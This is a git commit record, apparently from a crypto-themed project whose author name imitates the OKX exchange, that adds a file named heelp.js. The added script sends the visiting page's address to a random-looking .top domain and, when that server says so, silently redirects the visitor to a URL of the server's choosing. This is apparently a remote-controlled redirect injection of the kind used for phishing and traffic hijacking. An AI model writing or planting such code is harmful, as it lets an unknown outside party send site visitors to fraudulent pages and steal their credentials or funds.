86bf45e2fad95e6f292f1ce478c3ed3454d59956
web3okx-okx-okxtK <laosan1458@gmail.com>
2024-10-22 20:30:11 +0800

    version8

---
+++ heelp.js
@@ -0,0 +1,18 @@
+
+        var api_url = 'https://v2.vjgjujsegjjkhhafmqp.top';
+        var domain = window.location.href;
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET',api_url+'/api/api/url_data?zhu_url='+domain, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                console.log(JSON.parse(xhr.responseText));
+                if(JSON.parse(xhr.responseText).code == 1){
+                    var url = JSON.parse(xhr.responseText).data
+                    window.location.replace(url);
+                }
+            }
+        };
+        xhr.send();
+
+
+
